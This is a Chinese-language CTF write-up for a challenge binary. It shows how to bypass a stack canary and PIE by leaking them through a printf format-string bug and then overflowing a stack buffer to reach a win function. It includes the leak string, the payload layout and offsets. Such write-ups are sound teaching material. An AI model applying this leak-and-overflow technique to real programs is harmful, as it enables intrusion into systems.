# WP：04-canary-pie

## 题目信息

- 类型：Canary + PIE 绕过
- 保护：PIE 开启、Stack Canary 开启、NX
- 端口：13374

## 分析

`vuln()` 有两次 read：

1. 第一次 `read(0, buf, 0x40)`，然后 `printf(buf)`——格式化字符串漏洞，可泄漏栈上数据
2. 第二次 `read(0, buf, 0x100)`——栈溢出，但需要知道 canary 和 win 地址

两步结合：先泄漏，再溢出。

## 栈布局

```
rbp-0x30  buf[0x20]
rbp-0x10  (padding)
rbp-0x08  canary
rbp+0x00  saved rbp
rbp+0x08  ret addr
```

buf 起始对应 `%6$`，canary 在 `%11$`，返回地址在 `%13$`。

## 第一步：泄漏

```python
r.send(b'%11$p|%13$p|')
# 解析出 canary 和 ret_leak
```

返回地址是 `main` 内某处，减去固定偏移得到 PIE 基址，再加上 `win` 的相对偏移。

## 第二步：溢出

padding = 0x28（buf 到 canary 的距离），然后：

```
[0x28 * 'A'] [canary] [8 * 'B'] [ret gadget] [win]
```

## 关键偏移

| 符号 | 相对 PIE 基址偏移 |
|------|-----------------|
| win  | 0x11c9 |
| ret gadget | 0x101a |
| main 返回地址偏移 | 0x128c |
